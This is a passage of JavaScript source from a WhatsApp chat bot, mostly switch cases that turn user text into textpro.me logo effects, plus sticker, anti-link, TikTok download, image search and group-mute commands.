maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   

case 'holographic':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break



case 'bear':

if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'wolf':

if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'joker':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-joker-online-934.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'dropwater2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   case 'summertime':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-summer-neon-light-text-effect-online-1076.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'neonlight2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'thewall':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
case 'natural':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 

case 'carbon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'pencil':
if(!q) throw`Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'textmaker': {
   XeonBotInc.sendMessage(from, { react: { text: `✅`, key: m.key }})
if (args.length < 1) throw `Example :\n${prefix + command} <name>`
if (args[0] === 'glitch') {
if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
let teds = await thiccysapi.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [args[1]])
XeonBotInc.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
} else if (args[0] === 'glow') {
if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
let teds = await thiccysapi.textpro("https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html", [args[1]])
XeonBotInc.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
} else {
m.reply(`*Text Maker List :*\n•> glitch\n•> glow`)
}
}
break
case 'hoorror':{
XeonBotInc.sendMessage(from, { react: { text: `☠️`, key: m.key }})
     let link = `https://textpro.me/horror-blood-text-effect-online-883.html`
     let anui = await textpro(link, q)
     m.reply(`Wait a moment while making the logo about 1 minute`) 
     console.log(anui)
    XeonBotInc.sendMessage(from, {image:{url:anui}, caption:"Here you go!"}, {quoted:m})
}
   break
case 'whitebear':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'thunder2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-thunder-text-effect-online-881.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   break
case 'neon':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-online-882.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'matrix2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/matrix-style-text-effect-online-884.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sky':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'magma':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-magma-hot-text-effect-online-1030.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sand':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'pencil':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'graffiti':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'metallic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'steel':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'harrpotter':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'underwater':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-underwater-text-effect-generator-online-1013.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'luxury':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-luxury-gold-text-effect-online-1003.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'glue2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'fabric':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'neonlight':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-glitch-text-generator-online-1063.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'lava':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/lava-text-effect-online-914.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'toxic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/toxic-text-effect-online-901.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'ancient':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'christmas2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sparkles-merry-christmas-text-effect-1054.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sci_fi':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'rainbow':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'classic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'watercolor2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'halloweem2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-spooky-halloween-text-effect-online-1046.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'halloweenfire':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/halloween-fire-text-effect-940.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'writing':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'foggy':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'marvel':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'skeleton2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sketch':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'wonderful':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'batman':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'juice':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/fruit-juice-text-effect-861.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'pornhub':{
	XeonBotInc.sendMessage(from, { react: { text: `🔞`, key: m.key }})
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuphub = await textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
console.log(anuphub)
XeonBotInc.sendMessage(from,{image:{url:anuphub}, caption:"Here you go!"},{quoted:m})
}
break
case 'retro':{
XeonBotInc.sendMessage(from, { react: { text: `❌`, key: m.key }})
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anutro2 = await textpro("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
console.log(anutro2)
XeonBotInc.sendMessage(from,{image:{url:anutro2}, caption:"Here you go!"},{quoted:m})
}
break
case 'horror':{
XeonBotInc.sendMessage(from, { react: { text: `☠️`, key: m.key }})
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuror2 = await textpro("https://textpro.me/create-a-cinematic-horror-text-effect-1045.html", [`${logo4}`,`${logo9}`])
console.log(anuror2)
XeonBotInc.sendMessage(from,{image:{url:anuror2}, caption:"Here you go!"},{quoted:m})
}
break
case '8bit':{
XeonBotInc.sendMessage(from, { react: { text: `🚀`, key: m.key }})
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anubit8 = await textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
console.log(anubit8)
XeonBotInc.sendMessage(from,{image:{url:anubit8}, caption:"Here you go!"},{quoted:m})
}
break
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
case 'deepsea': case 'scifi': case 'rainbow2': case 'waterpipe': case 'spooky': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
case 'transformer': case 'berry': case 'thunder': case '.': case '3dstone2': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rockart': case 'bloodglas': case 'halloween': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpinkart': case 'sand': case 'glue': case '1917': case 'leaves': case 'demon': {
 XeonBotInc.sendMessage(from, { react: { text: `🧬`, key: m.key }})
             if (!q) throw `Example : ${prefix + command} ${global.ownername}`
             m.reply(mess.wait)
             let link
             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
             if (/3dstone2/.test(command)) link = 'https://textpro.me/create-a-3d-stone-text-effect-online-for-free-1073.html'
             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
             if (/rockart/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
             if (/halloween/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
             if (/blackpinkart/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
                if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'           
             let anutexpro = await maker.textpro(link, q)
                XeonBotInc.sendMessage(m.chat, { image: { url: anutexpro }, caption: `Made by ${global.botname}` }, { quoted: m })
             }
             break
             case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) throw `*Reply Video/Image With Caption* ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('*Maximum 10 seconds!*')
                let media = await quoted.download()
                let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `*Send Image/Video With Caption* ${prefix + command}\nDuration *Video 1-9 Seconds*`
                }
            }
            break
            case 'antilink': {
XeonBotInc.sendMessage(from, { react: { text: `⛔`, key: m.key }})
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (Antilinkgc) return m.reply('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
m.reply('Success in turning on antiwame in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return m.reply('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
m.reply('Success in turning off antiwame in this group')
} else {
  let buttonsntwame = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
			case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
                await XeonBotInc.sendButtonText(m.chat, buttons, lowq, botname, m, {quoted: fkontak})
            	}
            break
			case 'tiktok':{ 
XeonBotInc.sendMessage(from, { react: { text: `⏬`, key: m.key }})
if (!text) return m.reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
m.reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
    var button = [{ buttonId: `tiktokaudio ${q}`, buttonText: { displayText: `AUDIO‡` }, type: 1 }, { buttonId: `menu`, buttonText: { displayText: `Menu` }, type: 1 }]
XeonBotInc.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }, buttons: button, footer: botname, mentions: [sender] })
})
}
break
case 'img':
case 'image': {
XeonBotInc.sendMessage(from, { react: { text: `⬇️`, key: m.key }})
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraperW')
                anuxeonezy2 = await pinterest(text)
                resultkkk3 = anuxeonezy2[Math.floor(Math.random() * anuxeonezy2.length)]
                XeonBotInc.sendMessage(m.chat, { image: { url: resultkkk3 }, caption: `*IMG URL :*`+resultkkk3 }, { quoted: m })
            }
            break
			case 'mute': {
			      XeonBotInc.sendMessage(from, { react: { text: `♾️`, key: m.key }})
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`It's Been Active Before`)
                db.data.chats[m.chat].mute = true
                m.reply(`${XeonBotInc.user.name} has been muted in this group !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Not Activated Before`)
                db.data.chats[m.chat].mute = false
